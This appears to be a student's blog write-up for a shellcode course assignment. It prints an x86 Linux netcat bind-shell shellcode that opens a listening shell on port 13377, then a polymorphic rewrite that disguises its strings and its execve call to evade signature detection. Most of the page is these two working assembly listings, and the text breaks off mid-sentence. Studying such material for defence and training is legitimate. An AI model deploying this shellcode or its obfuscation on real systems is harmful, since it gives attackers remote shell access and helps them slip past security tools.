---
title:  Assignment 6
description: Create Polymorphic Versions of Sample Shellcode
order: 6
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

For this assignment we will be creating polymorphic versions of sample shellcode from [shell-storm](shell-storm.org).

The first shellcode we will be transforming is the [netcat bindshell](http://shell-storm.org/shellcode/files/shellcode-804.php), shown below:

```nasm
; netcat_bind_shell.nasm
;  - Listen on port 13377 using netcat and provide shell

    global _start

section .text
_start:

        xor eax,eax
        xor edx,edx
        push 0x37373333         ; 7733
        push 0x3170762d         ; 1pv-
        mov edx, esp

        push eax
        push 0x68732f6e         ; hs/n
        push 0x69622f65         ; ib/e
        push 0x76766c2d         ; vvl-
        mov ecx,esp

        push eax
        push 0x636e2f2f         ; cn//
        push 0x2f2f2f2f         ; ////
        push 0x6e69622f         ; nib/
        mov ebx, esp

        push eax
        push edx
        push ecx
        push ebx
        xor edx,edx
        mov  ecx,esp
        mov al,11               ; execve
        int 0x80
```

It seems there are several ways we can morph this shellcode.  First, we should obfuscate all those push commands, since they contain the string we intend to execute.  We can do this by saving each string in a register first, adding a constant to it, then pushing it to the stack.  To save space, we'll use the first push command as the constant.  The next piece we should obfuscate is the **execve** syscall, since that could be seen as suspicious.  Below is the resulting shellcode:

```nasm
; netcat_bind_shell.nasm
;  - Listen on port 13377 using netcat and provide shell
;
; [LINK] http://shell-storm.org/shellcode/files/shellcode-804.php

    global _start

section .text
_start:

        xor eax,eax
        mov edi, 0x37373333
        push edi
        mov esi, 0x68a7a960     ; 0x3170762d
        sub esi, edi            ; ...
        push esi                ; ...
        mov edx, esp
        push eax
        mov esi, 0x313bfc3b     ; push 0x68732f6e
        add esi, edi            ; ...
        push esi                ; ...
        mov esi, 0x322afc32     ; push 0x69622f65
        add esi, edi            ; ...
        push esi                ; ...
        mov esi, 0x3f3f38fa     ; push 0x76766c2d
        add esi, edi            ; ...
        push esi                ; ...
        mov ecx,esp
        push eax
        mov esi, 0x2c36fbfc     ; push 0x636e2f2f
        add esi, edi            ; ...
        push esi                ; ...
        mov esi, 0x66666262     ; push 0x2f2f2f2f
        sub esi, edi            ; ...
        push esi                ; ...
        mov esi, 0x37322efc     ; 0x6e69622f
        add esi, edi            ; ...
        push esi                ; ...
        mov ebx, esp
        push eax
        push edx
        push ecx
        push ebx
        xor edx,edx
        mov  ecx,esp
        mov al,10               ; mov al, 11
        inc eax                 ; ...
        int 0x80
```

The new shellcode is 85 bytes, about 37% more than the original 62 bytes.

Next, we'll look at the 

You can find the all the code to this challenge at [https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6](https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6).

<br>
{% include preamble.md %}

[&lt;&lt; Go Back]({{ site.baseurl }})
